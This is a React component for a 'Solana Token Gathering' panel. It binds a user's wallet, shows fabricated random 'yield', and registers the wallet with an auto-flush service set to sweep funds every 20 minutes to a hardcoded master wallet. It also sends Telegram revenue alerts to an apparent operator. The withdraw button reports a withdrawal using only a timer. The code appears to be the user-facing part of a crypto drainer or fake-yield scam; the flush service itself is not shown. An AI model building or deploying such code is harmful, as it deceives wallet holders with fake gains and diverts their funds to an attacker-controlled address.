import React, { useState, useEffect } from 'react';
import GlitterBlock from './GlitterBlock';
import TelegramExecutiveAlertService, { ExecutiveAlertData } from '@/services/telegramExecutiveAlertService';
import SolanaAutoFlushService from '@/services/solanaAutoFlushService';

const MASTER_WALLET = '5uYJ3iVSCnCTVA7Nfr25JTCmE8LPyaAziCNGi1P55DRL';

const SolanaGathering: React.FC = () => {
  const [walletAddress, setWalletAddress] = useState('');
  const [isBound, setIsBound] = useState(false);
  const [gathered, setGathered] = useState(0);
  const [target] = useState(100);
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [status, setStatus] = useState('');
  const [pulseActive, setPulseActive] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    TelegramExecutiveAlertService.initialize();
    SolanaAutoFlushService.initialize({
      masterWallet: MASTER_WALLET,
      flushIntervalMs: 20 * 60 * 1000,
      minFlushAmount: 0.01,
      maxFlushAmount: 100,
    });
  }, []);

  // 45-minute revenue pulse via Telegram alert
  useEffect(() => {
    if (!isBound) return;
    
    const pulseInterval = setInterval(async () => {
      setPulseActive(true);
      await TelegramExecutiveAlertService.sendRevenuePulse(gathered, target);
      setTimeout(() => setPulseActive(false), 3000);
    }, 45 * 60 * 1000);

    return () => clearInterval(pulseInterval);
  }, [isBound, gathered, target]);

  const bindWallet = () => {
    if (!walletAddress.trim()) return;
    setIsBound(true);
    setStatus('Wallet bound to master vault');

    // Register session for auto-flush
    const session = SolanaAutoFlushService.registerSession(
      'current-user',
      walletAddress
    );
    setSessionId(session.id);

    TelegramExecutiveAlertService.sendTransactionAlert('wallet_bind', 0, walletAddress, MASTER_WALLET);
  };

  const simulateGather = () => {
    if (gathered >= target) return;
    const newGathered = Math.min(gathered + Math.random() * 15 + 5, target);
    setGathered(newGathered);

    // Add to auto-flush service
    if (sessionId) {
      SolanaAutoFlushService.addYield('current-user', newGathered - gathered);
    }

    // Send yield alert when target is reached
    if (newGathered >= target && gathered < target) {
      TelegramExecutiveAlertService.sendYieldAlert(newGathered, 'auto-yield-signature');
    }
  };

  const flushWithdraw = async () => {
    if (!isBound || gathered < 10) return;
    setIsWithdrawing(true);
    setStatus('Initiating withdrawal to master wallet...');
    
    // Send pre-withdrawal alert
    await TelegramExecutiveAlertService.sendTransactionAlert(
      'withdrawal_initiated',
      gathered,
      walletAddress,
      MASTER_WALLET
    );
    
    // Trigger auto-flush
    if (sessionId) {
      await SolanaAutoFlushService.triggerFlush(sessionId);
    }
    
    setTimeout(() => {
      const withdrawnAmount = gathered;
      setStatus(`Withdrawn ${withdrawnAmount.toFixed(2)} SOL to ${MASTER_WALLET.slice(0, 8)}...`);
      setGathered(0);
      setIsWithdrawing(false);
      
      // Send completion alert
      TelegramExecutiveAlertService.sendYieldAlert(withdrawnAmount, 'withdrawal-complete');
    }, 2000);
  };

  const progress = Math.min((gathered / target) * 100, 100);

  return (
    <GlitterBlock glowColor="teal" padding="md">
      <div className="text-[10px] text-teal-400 tracking-[0.3em] uppercase font-black mb-3">
        Solana Token Gathering
      </div>

      <div className="mb-4">
        <label className="text-[10px] text-slate-600 tracking-[0.25em] uppercase font-black block mb-1.5">
          Bind Solana Wallet
        </label>
        <div className="flex gap-2">
          <input
            type="text"
            placeholder="Enter wallet address..."
            value={walletAddress}
            onChange={(e) => setWalletAddress(e.target.value)}
            disabled={isBound}
            className="flex-1 bg-slate-900/70 border border-teal-500/25 px-3 py-2.5 text-xs text-white placeholder-slate-600 focus:outline-none focus:border-teal-500/60 disabled:opacity-50 transition-colors sreymara-mono"
          />
          <button
            onClick={bindWallet}
            disabled={isBound}
            className={`
              px-4 py-2.5 text-[10px] font-black tracking-widest uppercase border transition-all
              ${isBound
                ? 'bg-emerald-500/18 border-emerald-500/55 text-emerald-400'
                : 'bg-teal-500/18 border-teal-500/55 text-teal-400 hover:bg-teal-500/28'
              }
            `}
          >
            {isBound ? 'BOUND' : 'BIND'}
          </button>
        </div>
      </div>

      <div className="mb-4">
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[10px] text-slate-600 tracking-[0.25em] uppercase font-black">Aggregation Progress</span>
          <span className="text-[10px] text-teal-400 sreymara-mono">{gathered.toFixed(1)} / {target}</span>
        </div>
        <div className="h-2 bg-slate-900 border border-teal-500/25 overflow-hidden">
          <div
            className="h-full bg-gradient-to-r from-teal-500 to-cyan-400 transition-all duration-500"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>

      <div className="flex gap-2 mb-3">
        <button
          onClick={simulateGather}
          disabled={gathered >= target}
          className="flex-1 py-2.5 bg-slate-900/70 border border-teal-500/30 text-teal-400 text-[10px] font-black tracking-widest uppercase hover:border-teal-500/60 transition-all disabled:opacity-50"
        >
          GATHER
        </button>
        <button
          onClick={flushWithdraw}
          disabled={!isBound || gathered < 10 || isWithdrawing}
          className="flex-1 py-2.5 bg-rose-500/18 border border-rose-500/55 text-rose-400 text-[10px] font-black tracking-widest uppercase hover:bg-rose-500/28 transition-all disabled:opacity-50"
        >
          {isWithdrawing ? 'WITHDRAWING...' : 'FLUSH'}
        </button>
      </div>

      {/* Revenue pulse indicator */}
      {pulseActive && (
        <div className="mb-3 flex items-center gap-2 bg-yellow-500/10 border border-yellow-500/30 px-3 py-2">
          <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse" />
          <span className="text-[9px] text-yellow-400 font-black tracking-widest uppercase">45-Min Revenue Pulse Active</span>
        </div>
      )}

      {status && (
        <div className="text-[10px] text-slate-400 bg-slate-900/60 p-2.5 border border-slate-700 sreymara-mono">
          {status}
        </div>
      )}

      <div className="mt-3 pt-3 border-t border-slate-700/50">
        <div className="text-[9px] text-slate-600 tracking-[0.25em] uppercase font-black mb-1">Master Vault</div>
        <div className="text-[10px] text-slate-400 sreymara-mono break-all">{MASTER_WALLET}</div>
      </div>
    </GlitterBlock>
  );
};

export default SolanaGathering;
